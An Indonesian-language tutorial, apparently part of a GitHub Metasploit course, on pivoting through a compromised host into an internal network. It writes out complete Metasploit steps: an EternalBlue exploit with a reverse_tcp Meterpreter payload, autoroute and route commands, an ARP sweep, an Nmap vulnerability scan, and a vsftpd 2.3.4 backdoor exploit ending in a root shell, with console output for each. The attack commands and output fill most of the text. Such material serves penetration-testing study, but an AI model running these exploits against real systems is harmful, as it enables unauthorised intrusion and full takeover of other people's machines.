<p align="left">
  <a href="https://github.com/fixploit03/Belajar-Metasploit-Framework/blob/main/resource/Post-Exploitation%20di%20Metasploit.md">Post-Exploitation di Metasploit</a>
</p>

# Pivoting dan Route Command di Metasploit

## A. Apa Itu Pivoting?

[Pivoting](https://en.wikipedia.org/wiki/Exploit_(computer_security)#Pivoting) adalah teknik menggunakan sistem yang telah dikompromikan sebagai `hot point` untuk menyerang sistem lain di jaringan internal yang hanya bisa diakses dari dalam.

Ada dua jenis pivoting:
- Layer 3 pivoting (routing) -> menggunakan `autoroute` dan `route` di Metasploit.
- Layer 2 pivoting (`ARP spoofing`, `bridge`) -> biasanya dilakukan dengan tools seperti [ettercap](https://www.ettercap-project.org/) atau [bettercap](https://www.bettercap.org/).

## B. Syarat Pivoting di Metasploit

- Sudah ada Meterpreter session di host pertama (pivot point).
- Host tersebut punya akses ke jaringan internal yang ingin dijelajahi.
- Modul `autoroute` atau perintah `route` digunakan untuk menambahkan rute jaringan internal.

## C. Langkah-Langkah Melakukan Pivoting di Metasploit

### 1. Dapatkan Akses ke Mesin Pertama

   Contoh:

   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.10
   set RPORT 445
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.5
   set LPORT 4444
   exploit
   ```

   Kalau hasil output-nya seperti ini:

   ```
   [+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   meterpreter >
   ```

   Itu artinya kita sudah mendapatkan akses ke mesin pertama.

### 2. Tambahkan Route Internal dengan `autoroute`

   Misalnya, mesin `A` bisa melihat jaringan internal `192.168.1.0/24`:

   ```
   run autoroute -s 192.168.1.0/24
   ```

   Keterangan:
    - `-s`: (subnet) jaringan internal target: `192.168.1.0/24`

   Hasil output-nya seperti ini:

   ```
   meterpreter > run autoroute -s 192.168.1.0/24
   [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
   [!] Example: run post/multi/manage/autoroute OPTION=value [...]
   [*] Adding a route to 192.168.1.0/255.255.255.0...
   [+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.45
   [*] Use the -p option to list all active routes
   ```

   Atau secara manual:
 
   ```
   background
   route add 192.168.1.0 255.255.255.0 4
   ```

   Keterangan:
   - `192.168.1.0`: Alamat IP Network target
   - `192.168.1.255`: Alamat IP Broadcast target
   - Angka `4`: Sesi ID Meterpreter

   Hasil output-nya seperti ini:

   ```
   meterpreter > background 
   [*] Backgrounding session 4...
   msf6 auxiliary(scanner/discovery/arp_sweep) > sessions 

   Active sessions
   ===============

     Id  Name  Type                     Information                     Connection
     --  ----  ----                     -----------                     ----------
     4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ADMIN-PC  192.168.1.42:4444 -> 192.168.1.45:49160 (192.168.1.45)

   msf6 auxiliary(scanner/discovery/arp_sweep) > route add 192.168.1.0 255.255.255.0 4
   [*] Route added
   msf6 auxiliary(scanner/discovery/arp_sweep) > 
   ```

   Cek route yang sudah ada:

   ```
   route print
   ```

   Hasil output-nya seperti ini:

   ```
   msf6 auxiliary(scanner/discovery/arp_sweep) > route print 

   IPv4 Active Routing Table
   =========================

      Subnet             Netmask            Gateway
      ------             -------            -------
      192.168.1.0        255.255.255.0      Session 4

      [*] There are currently no IPv6 routes defined.
   ```

### 3. Gunakan Modul `auxiliary/scanner` Melalui Route

   1. Kamu sekarang bisa melakukan scanning ke internal network.

      Contoh scanning semua host yang ada di internal:

      ```
      use auxiliary/scanner/discovery/arp_sweep
      set RHOSTS 192.168.1.0/24
      set verbose true
      run
      ```

      Ini akan meng-scan semua host yang up/aktif yang ada di jaringan yang sama, mulai dari host dengan alamat IP `192.168.1.1` sampai dengan host dengan alamat IP `192.168.1.254`.

      Hasil output-nya seperti ini:

      ```
      msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.1.0/24
      rhosts => 192.168.1.0/24
      msf6 auxiliary(scanner/discovery/arp_sweep) > set verbose true 
      verbose => true
      msf6 auxiliary(scanner/discovery/arp_sweep) > run
      [+] 192.168.1.1 appears to be up (UNKNOWN).
      [+] 192.168.1.4 appears to be up (UNKNOWN).
      [+] 192.168.1.7 appears to be up (UNKNOWN).
      [+] 192.168.1.12 appears to be up (UNKNOWN).
      [+] 192.168.1.45 appears to be up (CADMUS COMPUTER SYSTEMS).
      [+] 192.168.1.47 appears to be up (UNKNOWN).
      [+] 192.168.1.48 appears to be up (CADMUS COMPUTER SYSTEMS).
      [+] 192.168.1.42 appears to be up (ALFA, INC.).
      [*] Scanned 256 of 256 hosts (100% complete)
      [*] Auxiliary module execution completed
      msf6 auxiliary(scanner/discovery/arp_sweep) > 
      ```

      Dari hasil scan tersebut, ditemukan `8` host yang aktif dengan alamat IP Address sebagai berikut:
      - `192.168.1.1`
      - `192.168.1.4`
      - `192.168.1.7`
      - `192.168.1.12`
      - `192.168.1.42`
      - `192.168.1.45`
      - `192.168.1.47`
      - `192.168.1.45`

   2. Buat File `host.txt`:

      ```
      nano host.txt
      ```

   3. Isi dengan:

      ```
      192.168.1.1
      192.168.1.4
      192.168.1.7
      192.168.1.12
      192.168.1.42
      192.168.1.47
      192.168.1.48
      ```

      Kenapa host dengan alamat IP Address `192.168.1.45` tidak diikutsertakan? karena host tersebut sudah dieksploitasi alias sudah menjadi jembatan pertama untuk mengeksploitasi host-host yang lain.

   4. Scan Host-host Tersebut Menggunakan `Nmap`:

      ```
      sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
      ```

      Keterangan:
      - `-sS`: Menggunakan teknik `SYN` scan (stealth)
      - `-sV`: Mengaktifkan scan versi pada service yang discan
      - `-T4`: Templat waktu (semakin tinggi semakin cepat)
      - `-O`: Mengaktifkan scan OS (sistem operasi)
      - `--script vuln`: Jalankan semua skrip kategori vuln (vulnerability detection)
      - `-iL`: File yang berisi daftar host yang ingin di-scan: `host.txt`

      Hasil output-nya seperti ini:

      ```
      msf6 auxiliary(scanner/discovery/arp_sweep) > sudo nmap -sS -sV -T4 -O --script vuln -iL host.txt
      [*] exec: nmap -sS -sV -T4 -O --script vuln -iL host.txt

      Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 06:14 WIB

      Nmap scan report for 192.168.1.48
      Host is up (0.00061s latency).
      Not shown: 977 closed tcp ports (reset)
      PORT     STATE SERVICE     VERSION
      21/tcp   open  ftp         vsftpd 2.3.4
      | ftp-vsftpd-backdoor: 
      |   VULNERABLE:
      |   vsFTPd version 2.3.4 backdoor
      |     State: VULNERABLE (Exploitable)
      |     IDs:  CVE:CVE-2011-2523  BID:48539
      |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
      |     Disclosure date: 2011-07-03
      |     Exploit results:
      |       Shell command: id
      |       Results: uid=0(root) gid=0(root)
      |     References:
      |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
      |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
      |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
      |_      https://www.securityfocus.com/bid/48539
      | vulners: 
      |   vsftpd 2.3.4: 
      |     	PACKETSTORM:162145	10.0	https://vulners.com/packetstorm/PACKETSTORM:162145	*EXPLOIT*
      |     	EDB-ID:49757	9.8	https://vulners.com/exploitdb/EDB-ID:49757	*EXPLOIT*
      |     	CVE-2011-2523	9.8	https://vulners.com/cve/CVE-2011-2523
      |_    	1337DAY-ID-36095	9.8	https://vulners.com/zdt/1337DAY-ID-36095	*EXPLOIT*
      ```

      Dari hasil scan tersebut, ditemukan vulnerability pada service `FTP` dengan versi `vsftpd 2.3.4` pada host `192.168.1.48`.

   5. Kalian juga bisa cek apakah kerentanan tersebut ada atau tidak di Exploit-DB dmenggunakan `searchsploit`:

      ```
      searchsploit vsftpd 2.3.4
      ```

      Hasil output-nya seperti ini:

      ```
      msf6 auxiliary(scanner/discovery/arp_sweep) > searchsploit vsftpd 2.3.4
      [*] exec: searchsploit vsftpd 2.3.4

      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
       Exploit Title                                                                                                                                                                   |  Path
      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
      vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py
      vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb
      --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
      Shellcodes: No Results
      ```

      Dari hasil pencarian menggunakan `searchsploit`, ditemukan sebuah exploit di Exploit-DB dengan judul `vsftpd 2.3.4`.

### 4. Lanjutkan Eksploitasi ke Mesin Internal

   1. Setelah menemukan host yang aktif dan host tersebut memiliki kerentanan (vulnerability). Maka tahap selanjutnya adalah mengeksploitasi host tersebut sesuai dengan vulnerability-nya. Disini berhubung kerentanannya ada pada service `FTP` dengan versi `vsftpd 2.3.4`, kita cari kerentanan tersebut dengan:

      ```
      search vsftpd 2.3.4
      ```

      Hasil output-nya seperti ini:

      ```
      msf6 auxiliary(scanner/discovery/arp_sweep) > search vsftpd 2.3.4

      Matching Modules
      ================

         #  Name                                  Disclosure Date  Rank       Check  Description
         -  ----                                  ---------------  ----       -----  -----------
         0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


      Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
      ```

      Dari hasil tersebut ditemukan exploit `VSFTPD v2.3.4 Backdoor Command Execution` dengan nama modul `exploit/unix/ftp/vsftpd_234_backdoor`.

   2. Gunakan Modul Tersebut:

      ```
      use exploit/unix/ftp/vsftpd_234_backdoor
      ```

      Atau bisa dengan:

      ```
      use 0
      ```

      > Angka `0` itu ID dari modul Metasploit.

   3. Lihat Opsi Konfigurasi:

      ```
      show options
      ```

      Hasil output-nya seperti ini:

      ```
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options 

      Module options (exploit/unix/ftp/vsftpd_234_backdoor):

         Name     Current Setting  Required  Description
         ----     ---------------  --------  -----------
         CHOST                     no        The local client address
         CPORT                     no        The local client port
         Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
         RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
         RPORT    21               yes       The target port (TCP)


      Exploit target:

         Id  Name
         --  ----
         0   Automatic



      View the full module info with the info, or info -d command.
      ```

   3. Setting Target:

      ```
      set PAYLOAD cmd/unix/interact
      set RHOSTS 192.168.1.48
      set RPORT 21
      set verbose true
      ```

   4. Jalankan Exploit:

      ```
      exploit
      ```

      Kalau hasil output-nya seperti ini:

      ```
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
      PAYLOAD => cmd/unix/interact
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.48
      RHOSTS => 192.168.1.48
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
      RPORT => 21
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set verbose true
      verbose => true
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
      [*] 192.168.1.48:21 - Banner: 220 (vsFTPd 2.3.4)
      [*] 192.168.1.48:21 - USER: 331 Please specify the password.
      [+] 192.168.1.48:21 - Backdoor service has been spawned, handling...
      [+] 192.168.1.48:21 - UID: uid=0(root) gid=0(root)
      [*] Found shell.
      [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +070
      ```

      Itu artinya exploit kita terhadap service `FTP` dengan versi `vsftpd 2.3.4` berhasil dilakukan. dan kita bisa melakukan apa saja di dalam mesin target.

      Contohnya:

      Menampilkan nama user yang sedang aktif pada sesi ini:
  
      ```
      whoami
      ```

      Hasil output-nya seperti ini:

      ```
      [*] Command shell session 5 opened (192.168.1.45:49166 -> 192.168.1.48:6200 via session 4) at 2025-05-10 05:59:37 +0700

      whoami
      root
      ```

      Dari hasil `whoami`, user yang aktif pada sesi ini adalah user `root`.

### Tips Tambahan
- Gunakan `arp` di Meterpreter untuk melihat host yang pernah diakses:

   ```
  meterpreter > arp
  ```

- Gunakan `netstat` untuk lihat koneksi:

  ```
  meterpreter > netstat
  ```

<p align="right">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Integrasi%20Metasploit%20dengan%20Nmap%20dan%20Nikto.md">Integrasi Metasploit dengan Nmap dan Nikto</a>
</p>
